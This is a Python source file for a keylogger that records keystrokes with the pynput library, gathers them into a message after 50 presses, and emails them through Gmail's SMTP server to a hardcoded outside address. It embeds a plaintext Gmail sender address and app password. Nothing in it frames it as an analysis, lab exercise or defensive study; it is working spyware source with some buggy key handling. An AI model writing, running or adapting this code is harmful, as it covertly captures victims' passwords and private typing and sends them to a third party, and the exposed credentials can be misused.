import pynput
from pynput.keyboard import Key, Listener
import smtplib

class emailService:
    def __init__(self) -> None:
        pass
        
    def send_mail(self,sender_email, sender_password, receiver_email,subject=None,msg=None):
        smtp = 'smtp.gmail.com'
        smtp_port = 587
        session = smtplib.SMTP(smtp, smtp_port)
        session.starttls()
        session.login(sender_email,sender_password)
        session.sendmail(from_addr=sender_email,
                         to_addrs=receiver_email,
                         msg=msg)

count = 0
keys = []

def email(keys):
    message = ""
    for key in keys:
        k = key.replace("'","")
        if key == "Key.space":
            k = " " 
        elif key.find("Key") > 0:
            k = ""
        message += k
    print(message)

    email = emailService();
    print(f"email {email}")
    email.send_mail(
        sender_email="pythonsendmail8@gmail.com",
        sender_password="ymunhhhojswuiaqg",
        receiver_email="buitien747@gmail.com",
        subject="Test mail",
        msg=message
    )   

def on_press(key):
    # 'A' pressed
    print(key, end=" ")
    print("pressed")
    if key == "Key.f12":
        raise SystemExit(0)

    global keys, count

    keys.append(str(key))
    count += 1

    if count > 50:
        count = 0
        email(keys)
        raise SystemExit(0)
        

def on_release(key):
    if key == Key.esc:
        return False
    
with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()